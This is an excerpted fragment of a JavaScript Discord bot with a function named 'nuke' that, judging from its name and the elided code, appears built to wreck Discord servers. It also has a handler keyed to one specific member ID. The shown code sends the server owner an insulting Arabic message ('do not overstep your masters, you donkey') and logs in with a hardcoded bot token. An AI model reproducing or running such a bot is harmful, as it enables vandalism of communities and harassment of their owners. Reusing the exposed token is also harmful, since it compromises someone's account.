...
async function nuke(guild) {
  ...
  await guild.owner.send('    لا تتطاول على اسيادك ياحمار ').catch(e => { return void e; });
...
LOka.on('guildMemberAdd', member => {
            ...
            if (member.id === "433670948776968192") {
...
LOka.login("NTA5MTU3MTg5MDAxMjgxNTQ1.XVoNqA.Ohqvijt7eU-ud6k5rG2fyFhiusY")